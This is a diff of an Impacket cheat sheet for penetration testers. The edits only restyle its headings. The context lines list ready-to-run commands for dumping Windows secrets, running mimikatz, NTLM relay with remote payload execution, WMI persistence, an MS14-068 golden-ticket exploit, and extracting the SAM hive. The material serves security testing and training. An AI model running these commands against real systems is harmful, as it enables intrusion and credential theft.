@@ -1,6 +1,6 @@
-# impacket
+# impacket cheat sheet
 
-## General <a href="#general" id="general"></a>
+## <mark style="color:red;">General</mark> <a href="#general" id="general"></a>
 
 ```
 # Almost every Impacket scripts follows the same option syntax
@@ -27,7 +27,7 @@ connection:
                         it
 ```
 
-## Windows Secrets <a href="#windows-secrets" id="windows-secrets"></a>
+## <mark style="color:red;">Windows Secrets</mark> <a href="#windows-secrets" id="windows-secrets"></a>
 
 ```bash
 # Performs various techniques to dump secrets from the remote machine without 
@@ -60,7 +60,7 @@ mimikatz.py domain/user:password@IP
 mimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:passwor
 ```
 
-## Server Tools / MiTM Attacks <a href="#server-tools-mitm-attacks" id="server-tools-mitm-attacks"></a>
+## <mark style="color:red;">Server Tools / MiTM Attacks</mark> <a href="#server-tools-mitm-attacks" id="server-tools-mitm-attacks"></a>
 
 ```bash
 # This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying
@@ -80,7 +80,7 @@ smbserver.py SHARENAME /path/to/your/local/share
 smbserver.py SHARENAME /path/to/your/local/share --username user --password password
 ```
 
-## WMI <a href="#wmi" id="wmi"></a>
+## <mark style="color:red;">WMI</mark> <a href="#wmi" id="wmi"></a>
 
 ```bash
 # It allows to issue WQL queries and get description of WMI objects at 
@@ -95,7 +95,7 @@ wmipersist.py domain/user:password@IP install
 wmipersist.py domain/user:password@IP remove
 ```
 
-## Known vulnerabilities <a href="#known-vulnerabilities" id="known-vulnerabilities"></a>
+## <mark style="color:red;">Known vulnerabilities</mark> <a href="#known-vulnerabilities" id="known-vulnerabilities"></a>
 
 ```bash
 # Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.
@@ -114,7 +114,7 @@ smbrelayx.py -h victimIP -c cmdToExecute
 smbrelayx.py -h victimIP -e payload.exe
 ```
 
-## SMB/MSRPC <a href="#smb-msrpc" id="smb-msrpc"></a>
+## <mark style="color:red;">SMB/MSRPC</mark> <a href="#smb-msrpc" id="smb-msrpc"></a>
 
 ```bash
 # A generic SMB client that will let you list shares and files, rename,
@@ -166,7 +166,7 @@ lookupsid.py domain/user:password@IP
 lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password
 ```
 
-## MSSQL/TDS <a href="#mssql-tds" id="mssql-tds"></a>
+## <mark style="color:red;">MSSQL/TDS</mark> <a href="#mssql-tds" id="mssql-tds"></a>
 
 ```bash
 # Retrieves the MSSQL instances names from the target host.
@@ -176,7 +176,7 @@ mssqlinstance.py 192.168.1.2
 mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x
 ```
 
-## File Formats <a href="#file-formats" id="file-formats"></a>
+## <mark style="color:red;">File Formats</mark> <a href="#file-formats" id="file-formats"></a>
 
 ```bash
 # An Extensibe Storage Engine format implementation. Allows dumping catalog, 
@@ -193,7 +193,7 @@ ntfs-read.py "\C:" -extract "\windows\system32\config\sam"
 registry-read.py registryHive enum_key,enum_values,get_value,get_class,walk}
 ```
 
-## Others <a href="#others" id="others"></a>
+## <mark style="color:red;">Others</mark> <a href="#others" id="others"></a>
 
 ```bash
 # This script will gather data about the domain's users and their corresponding email addresses.
